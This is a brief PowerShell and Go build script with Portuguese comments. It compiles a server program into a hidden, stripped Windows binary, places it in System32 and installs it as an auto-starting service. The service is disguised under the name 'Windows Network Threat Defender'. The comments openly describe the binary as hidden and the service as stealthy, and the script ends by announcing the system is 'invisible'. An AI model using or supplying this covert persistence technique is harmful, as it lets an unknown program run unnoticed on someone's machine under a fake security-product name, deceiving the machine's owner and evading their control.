# Compila o binário oculto
go build -ldflags "-H=windowsgui -s -w" -o SecurityMonitor.exe server.go

# Define caminhos
$Dest = "C:\Windows\System32\SecurityMonitor.exe"
Copy-Item -Path ".\SecurityMonitor.exe" -Destination $Dest -Force

# Cria o serviço furtivo
New-Service -Name "WinNetDefend" `
            -BinaryPathName $Dest `
            -DisplayName "Windows Network Threat Defender" `
            -StartupType Automatic

Start-Service "WinNetDefend"
Write-Host "✅ Sistema Ativo e Invisível!" -ForegroundColor Green